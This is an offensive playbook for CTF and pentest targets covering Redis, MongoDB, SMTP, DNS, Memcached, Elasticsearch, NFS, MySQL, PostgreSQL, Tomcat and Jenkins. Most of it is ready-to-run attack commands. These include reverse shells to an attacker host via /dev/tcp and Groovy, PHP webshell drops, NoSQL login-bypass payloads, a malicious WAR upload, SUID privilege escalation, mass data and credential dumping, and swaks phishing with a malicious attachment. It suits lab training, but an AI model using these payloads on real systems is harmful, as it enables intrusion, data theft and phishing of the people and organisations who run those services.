# Service-Specific Attack Playbook

Attack techniques for common services found on CTF/pentest targets.
Detection: run `nmap -sV -p- TARGET` then match open ports to sections below.

---

## Port Quick Reference

| Port | Service | Key Attack |
|------|---------|-----------|
| 6379 | Redis | Unauthenticated RCE via CONFIG SET |
| 27017 | MongoDB | No-auth dump, NoSQL injection |
| 25/587 | SMTP | User enum (VRFY), open relay |
| 53 | DNS | Zone transfer (AXFR) |
| 11211 | Memcached | No-auth key dump |
| 9200/9300 | Elasticsearch | No-auth index dump |
| 2049 | NFS | no_root_squash → SUID |
| 3306 | MySQL | `mysql -u root -p` (blank pass), UDF privesc |
| 5432 | PostgreSQL | `psql -U postgres`, `COPY` file read/write |
| 8080/8443 | Tomcat | Manager console → WAR upload RCE |
| 4848 | GlassFish | Admin console → deploy |
| 9090 | Jenkins | Script console → Groovy RCE |

---

## 1. Redis

### Detection
```bash
nmap -sV -p 6379 TARGET
redis-cli -h TARGET ping      # PONG = unauthenticated
```

### No-Auth Check + Info
```bash
redis-cli -h TARGET
> INFO server               # version, OS, config file path
> CONFIG GET dir            # working directory
> CONFIG GET dbfilename     # database filename
> KEYS *                    # list all keys
> GET keyname               # retrieve key
```

### RCE via Crontab
```bash
redis-cli -h TARGET
> CONFIG SET dir /var/spool/cron/crontabs
> CONFIG SET dbfilename root
> SET shell "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n\n"
> BGSAVE
# Wait 60s for cron to trigger
```

### RCE via SSH authorized_keys
```bash
# Generate key pair first
ssh-keygen -t rsa -f /tmp/redis_key -N ""
PUBKEY=$(cat /tmp/redis_key.pub)

redis-cli -h TARGET
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SET key "\n\n$PUBKEY\n\n"
> BGSAVE

ssh -i /tmp/redis_key root@TARGET
```

### RCE via Webshell
```bash
redis-cli -h TARGET
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename cmd.php
> SET shell "<?php system($_GET['cmd']); ?>"
> BGSAVE

curl "http://TARGET/cmd.php?cmd=id"
```

### Module Load RCE (if file write available)
```bash
# Download RedisModules-ExecuteCommand.so to target
redis-cli -h TARGET MODULE LOAD /tmp/exp.so
redis-cli -h TARGET system.exec "id"
```

### Automated Tool
```bash
# redis-rogue-server (all-in-one)
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER
```

---

## 2. MongoDB

### Detection + No-Auth
```bash
nmap -sV -p 27017,27018 TARGET
mongo --host TARGET --port 27017
> show dbs
> use admin
> db.getUsers()
> db.system.users.find().pretty()
```

### Data Exfil
```bash
mongo --host TARGET
> show dbs
> use TARGET_DB
> show collections
> db.users.find().pretty()        # dump users collection
> db.users.findOne()              # first document
> db.users.count()                # total records
```

### Credential Cracking
```bash
# Hashes from db.system.users: stored as SCRAM-SHA-1 or SCRAM-SHA-256
# SCRAM-SHA-1: hashcat -m 24100
# SCRAM-SHA-256: hashcat -m 24200
```

### NoSQL Injection (Web)
```bash
# Auth bypass via JSON operators
# POST /login body:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

# Array injection (if PHP: param[]=)
username[$ne]=null&password[$ne]=null

# $where operator injection
{"username": {"$where": "this.username == 'admin' || 1==1"}}
```

### Tools
```bash
# NoSQLMap
python3 nosqlmap.py
# nosql-login-bypass wordlist
# Burp Suite Intruder with operator payloads
```

---

## 3. SMTP

### Enumeration
```bash
nmap -p 25,465,587 --script smtp-enum-users,smtp-open-relay,smtp-commands TARGET

# Manual
nc TARGET 25
EHLO x                         # list supported commands
VRFY root                      # verify user exists (250 = exists, 550 = no)
EXPN staff                     # expand mailing list
RCPT TO:<root>                 # sometimes reveals users via error message
```

### User Enumeration
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t TARGET
smtp-user-enum -M EXPN -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -D TARGET -t TARGET
```

### Open Relay Test
```bash
nc TARGET 25
HELO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>     # if 250 OK = open relay
DATA
Subject: Test
Body
.
QUIT
```

### Send Mail via SWAKS
```bash
# Test relay
swaks --to victim@domain.com --from attacker@evil.com --server TARGET

# With auth
swaks --to victim@domain --from user@domain --server TARGET \
  --auth LOGIN --auth-user user --auth-password pass

# Phishing (with attachment)
swaks --to victim@domain --from it@target.com --server TARGET \
  --attach /tmp/malicious.docx --header "Subject: Important Update"
```

---

## 4. DNS Zone Transfer

### AXFR Attempt
```bash
# Find nameservers first
nslookup -type=NS TARGET_DOMAIN
dig NS TARGET_DOMAIN

# Zone transfer
dig axfr @NAMESERVER_IP TARGET_DOMAIN
dig axfr @TARGET_IP TARGET_DOMAIN   # if target is the nameserver

# Alternative tools
host -t axfr TARGET_DOMAIN NAMESERVER_IP
dnsrecon -d TARGET_DOMAIN -t axfr
fierce --domain TARGET_DOMAIN
```

### What to Look For
```
# Internal hostnames → expand attack surface
# Mail servers (MX) → phishing pivot
# Subdomains → web attack surface expansion
# Internal IPs (10.x, 192.168.x, 172.16.x) → network map
# Commented entries (TXT records) → credentials, secrets
```

### DNS Recon (No Zone Transfer)
```bash
# Brute force subdomains
dnsrecon -d TARGET_DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d TARGET_DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
amass enum -d TARGET_DOMAIN

# Reverse DNS
dnsrecon -r 10.10.10.0/24 -t reverse
```

---

## 5. Memcached

### Detection + Connect
```bash
nmap -p 11211 --script memcached-info TARGET
nc TARGET 11211
telnet TARGET 11211
```

### Dump All Keys
```bash
# Step 1: get slab IDs
stats slabs

# Step 2: for each slab ID, get item count
stats items

# Step 3: dump keys from each slab (format: stats cachedump SLAB_ID COUNT)
stats cachedump 1 100
stats cachedump 2 100

# Step 4: retrieve values
get KEYNAME

# Automated dump
python3 -c "
import socket, re
s = socket.socket()
s.connect(('TARGET', 11211))
s.send(b'stats items\r\n')
data = s.recv(4096).decode()
for slab in re.findall(r'STAT items:(\d+):', data):
    s.send(f'stats cachedump {slab} 100\r\n'.encode())
    keys_data = s.recv(4096).decode()
    for key in re.findall(r'ITEM (\S+)', keys_data):
        s.send(f'get {key}\r\n'.encode())
        print(f'{key}: {s.recv(4096).decode()}')
"
```

### Common Finds
- Session tokens / session data
- API keys, access tokens
- Cached user objects (email, roles)
- Database query results with sensitive data

---

## 6. Elasticsearch

### Detection + Index List
```bash
nmap -p 9200,9300 TARGET
curl -s http://TARGET:9200/           # cluster info (no auth = vulnerable)
curl -s http://TARGET:9200/_cat/indices?v    # list all indices
curl -s http://TARGET:9200/_cat/nodes?v     # cluster nodes
```

### Dump Data
```bash
# Dump entire index (up to 10,000 docs)
curl -s "http://TARGET:9200/INDEX_NAME/_search?size=10000&pretty"

# Search for sensitive fields
curl -s "http://TARGET:9200/_all/_search?q=password&pretty"
curl -s "http://TARGET:9200/_all/_search?q=email&pretty"
curl -s "http://TARGET:9200/_all/_search?q=api_key&pretty"

# All data from all indices
curl -s "http://TARGET:9200/_search?size=1000&pretty"
```

### Admin Actions (if write access)
```bash
# Create admin user (X-Pack)
curl -XPUT "http://TARGET:9200/_xpack/security/user/attacker" \
  -H "Content-Type: application/json" \
  -d '{"password":"P@ssword1","roles":["superuser"]}'

# Delete index (destructive — do not do this on pentest)
# curl -XDELETE "http://TARGET:9200/INDEX_NAME"
```

---

## 7. NFS

### Detection + Mount
```bash
nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs TARGET
showmount -e TARGET             # list exports

# Mount
mkdir -p /mnt/nfs
mount -t nfs TARGET:/export /mnt/nfs
mount -t nfs -o ro TARGET:/export /mnt/nfs    # read-only if permission issues

# After mount
ls -la /mnt/nfs
cat /mnt/nfs/etc/passwd         # if full / is exported
```

### no_root_squash Exploitation
```bash
# Check /etc/exports on target: "no_root_squash" = root on attacker = root on share
cat /etc/exports   # on target (if you have access)

# Exploit: create SUID bash on mounted share
cp /bin/bash /mnt/nfs/tmp/bash_suid
chmod +s /mnt/nfs/tmp/bash_suid
# Execute on target:
/tmp/bash_suid -p    # runs with owner's UID (root if created as root)
```

---

## 8. MySQL

### No-Auth / Default Creds
```bash
mysql -u root -h TARGET            # blank password
mysql -u root -p -h TARGET         # try: root, toor, password, mysql
# Common: root:root, root:password, root:(blank)
```

### File Read / Write (if FILE privilege)
```bash
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';
```

### UDF Privilege Escalation (MySQL running as root)
```bash
# Check
mysql> SELECT @@global.secure_file_priv;   # empty = no restriction
mysql> SHOW VARIABLES LIKE 'plugin_dir';   # where to drop .so

# Upload malicious UDF library to plugin_dir, create FUNCTION
# Metasploit: use exploit/multi/mysql/mysql_udf_payload
```

---

## 9. PostgreSQL

### Access
```bash
psql -U postgres -h TARGET        # no password
psql -U postgres -h TARGET -p 5432
# In psql:
\list                              # databases
\c DATABASE                        # connect
\dt                                # tables
SELECT * FROM users LIMIT 10;
```

### File Read / Write
```bash
COPY (SELECT '') TO '/var/www/html/cmd.php';    # write empty file test
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php';
COPY users FROM '/etc/passwd';                  # read into table
```

### RCE via COPY (postgres superuser)
```bash
# Large Object method
SELECT lo_import('/etc/passwd');
SELECT lo_get(OID);

# Command execution via COPY PROGRAM (PostgreSQL 9.3+)
COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"';
```

---

## 10. Apache Tomcat

### Default Credentials for Manager
```
admin:admin, admin:password, tomcat:tomcat, tomcat:s3cret
manager:manager, both:both
```

### WAR Deploy → RCE
```bash
# Generate WAR with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f war > shell.war

# Deploy via Tomcat Manager web UI: /manager/html → WAR file to deploy

# Or via curl
curl -u tomcat:s3cret "http://TARGET:8080/manager/text/deploy?path=/shell&update=true" \
  --upload-file shell.war

# Trigger
curl http://TARGET:8080/shell/
```

---

## 11. Jenkins

### Script Console RCE (if accessible)
```
http://TARGET:8080/script
```
```groovy
// Groovy script execution
def cmd = "id".execute()
println cmd.text

// Reverse shell
def revshell = ['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'].execute()
```

### Credential Extraction
```bash
# Jenkins stores credentials encrypted in /var/lib/jenkins/credentials.xml
# If you have file read: extract + decrypt with jenkins-decrypt tool
# Or via script console:
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]
  .getCredentials().each { println it.id + ": " + it.secret }
```
